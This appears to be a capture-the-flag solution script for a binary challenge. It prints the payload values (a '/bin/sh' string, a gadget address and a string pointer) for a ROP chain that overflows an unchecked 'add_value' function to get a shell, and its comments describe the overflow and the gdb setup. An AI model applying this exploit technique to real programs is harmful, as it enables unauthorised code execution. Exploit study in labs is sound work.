def invert_endianness(val):
    new_val = 0
    for _ in range(8):
        new_val = (val & 0xff) | (new_val << 8)
        val >>= 8
    return new_val

def addOnstackBytes(id, value, isbig):
    val = int.from_bytes(value, byteorder='little')
    if isbig:
        val = invert_endianness(val=val)
    
    print("ID:", id, "Bytes:",val )

def addOnstackAddr(id, value, isbig):
    val = value
    if isbig:
        val = invert_endianness(val=val)

    print("ID:", id, "addr:",val )


gadget_addr = 0x7ffff7ffa000
binsh_addr = 0x7fffffffec98

print("BUILD GADGET: 3 - 7 - 2 - 6")

print("ADD THE FOLLOWING DATA: \n")

print("LITTLE ENDIAN")
addOnstackBytes(0x1b, b"/bin/sh", False)
addOnstackBytes(0x2b, b"LOOL", False)
addOnstackAddr(0x02, gadget_addr, False)
addOnstackAddr(0x3b, binsh_addr, False)

print("BIG ENDIAN")
addOnstackBytes(0x1b, b"/bin/sh", True)
addOnstackBytes(0x2b, b"LOOL", True)
addOnstackAddr(0x02, gadget_addr, True)
addOnstackAddr(0x3b, binsh_addr, True)


#Run this to align the stack with the address took with gdb
#env -i "PWD=/home/m226002/mission1" SHLVL=0 /home/m226002/mission1/mission1

# This challenge is a classic rop chain. The vulnerability is in the function 
# "add_value". There is no checks on the number of data, so you can do a buffer 
# overflow. Looking at the memory it was easy to understand where overwrite
# and with what. Many times, for some not sure reason, the composition doesn't work
# so repeat the process till you get the flag. To understand the rop look at the script
# and debug looking the stack
